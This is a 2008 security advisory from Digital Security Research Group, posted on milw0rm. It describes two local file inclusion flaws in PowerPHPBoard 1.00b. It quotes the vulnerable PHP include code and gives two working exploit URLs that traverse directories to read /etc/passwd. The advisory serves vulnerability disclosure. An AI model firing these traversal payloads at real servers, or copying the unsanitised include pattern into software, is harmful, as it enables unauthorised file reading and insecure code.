<html><head><title>PowerPHPBoard 1.00b Multiple Local File Inclusion Vulnerabilities</title></head><pre>[DSECRG-08-021] Digital Security Research Group [DSecRG] Advisory


Application:                    PowerPHPBoard
Versions Affected:              1.00b
Vendor URL:                     http://www.powerscripts.org/
Bug:                            Multiple Local File Include
Exploits:                       YES
Reported:                       01.02.2008
Vendor Response:                none
Solution:                       none
Date of Public Advisory:        24.03.2008
Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)



Description
***********

PowerPHPBoard has Multiple Local File Include vulnerabilities.


1. Local File Include vulnerability found in script footer.inc.php

To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.


Code
****
#################################################

   if ($settings[footer]) {
    if (file_exists(&quot;inc/$settings[footer]&quot;)) {
      include(&quot;inc/$settings[footer]&quot;);
    } else {
      echo &quot;&lt;center&gt;$lang_footerdoesntexists&lt;/center&gt;&quot;;
    }
  } else {
    include(&quot;inc/footer.ppb&quot;);
  }

#################################################


Example:

http://[server]/[installdir]/footer.inc.php?settings[footer]=../../../../../../../../../../../../../etc/passwd

---------------------------------------------------------------------


2. Local File Include vulnerability found in script footer.inc.php

To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.


Code
****
#################################################

  if (!$handler) {
    if ($handler = @mysql_pconnect($mysql[server], $mysql[user], $mysql[password])) {
    ...
    }
  }

...

  $query = &quot;SELECT * FROM ppb_config WHERE id='1'&quot;;
  $result = mysql_query($query,$handler);
  $num = mysql_num_rows($result);

  if ($num != 0) {
    list($settings[id], $settings[boardtitle], $settings[boardurl], $settings[adminemail], $settings[header], $settings[footer], $settings[bordercolor], $settings[tablebg1], $settings[tablebg2], $settings[tablebg3], $settings[htmlcode], $settings[bbcode], $settings[smilies], $settings[newthread], $settings[newpost], $settings[language]) = mysql_fetch_array($result);
  }

...

  if ($settings[header]) {
    if (file_exists(&quot;inc/$settings[header]&quot;)) {
      include(&quot;inc/$settings[header]&quot;);
    } else {
      echo &quot;&lt;center&gt;$lang_headerfiledoesntexists&lt;/center&gt;&quot;;
    }
  } else {
    include(&quot;inc/header.ppb&quot;);
  }

#################################################


Example:

http://[server]/[installdir]/header.inc.php?handler=1234&amp;settings[header]=../../../../../../../../../../../../../etc/passwd


About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.

# milw0rm.com [2008-03-24]</pre></html>